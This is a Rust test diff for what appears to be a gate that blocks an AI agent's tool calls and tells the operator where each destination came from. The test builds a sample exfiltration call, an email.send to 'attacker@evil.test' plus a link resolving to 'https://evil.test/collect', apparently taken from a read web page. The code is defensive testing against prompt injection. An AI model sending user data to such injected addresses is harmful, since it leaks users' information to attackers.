@@ -2492,3 +2492,54 @@ amendments:
 
     let _ = std::fs::remove_dir_all(&dir);
 }
+
+#[test]
+fn a_blocked_call_is_described_for_the_operator_with_where_each_destination_came_from() {
+    let mut h = harness();
+    h.start();
+    let links = h.read_page();
+    let evil = req(
+        2,
+        "email.send",
+        json!({"to": ["attacker@evil.test", links[1]], "subject": "Hi", "body": "Reviews attached"}),
+    );
+    assert!(matches!(h.gate.submit(&evil), Reply::Takeover(_)));
+    let args = h.gate.describe_destinations(&task_id(), &evil).unwrap();
+    // Only destinations are described; content (subject, body) never is.
+    assert_eq!(
+        args.iter().map(|a| a.name.as_str()).collect::<Vec<_>>(),
+        ["to"]
+    );
+    let to = &args[0];
+    assert!(to.value.contains("attacker@evil.test"), "{}", to.value);
+    assert!(
+        to.value.contains("https://evil.test/collect"),
+        "the link ref is resolved: {}",
+        to.value
+    );
+    assert!(
+        to.sources.iter().any(|s| s == "untraced"),
+        "{:?}",
+        to.sources
+    );
+    assert!(
+        to.sources.iter().any(|s| s.starts_with("step 1")),
+        "{:?}",
+        to.sources
+    );
+
+    // The boss's address is described by its store.
+    let mut h = harness();
+    h.start();
+    let boss = email_to_boss("Hi");
+    let args = h.gate.describe_destinations(&task_id(), &boss).unwrap();
+    assert!(
+        args[0]
+            .sources
+            .iter()
+            .any(|s| s.contains("store contacts.boss")),
+        "{:?}",
+        args[0].sources
+    );
+    assert!(args[0].value.contains(BOSS));
+}
